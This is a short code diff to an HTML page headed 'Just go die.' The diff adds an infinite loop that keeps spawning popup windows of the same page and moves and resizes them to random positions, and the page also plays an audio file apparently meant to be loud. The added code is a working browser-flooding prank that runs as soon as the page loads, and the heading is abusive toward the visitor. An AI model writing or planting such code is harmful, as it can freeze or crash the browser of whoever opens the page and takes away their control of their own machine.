@@ -6,6 +6,11 @@
 <h1>Just go die.</h1>
 <script>
 var win;
+  while(true){
+  win = window.open(location.href, "", "width = 200, height = 350");
+win.moveTo(Math.random() * 1982, Math.random() * 1080);
+win.resizeTo(Math.random() * 1982, Math.random() * 1080);
+}
 var audio = new Audio('farewell_eardrums.wav');
 audio.play();
 </script>
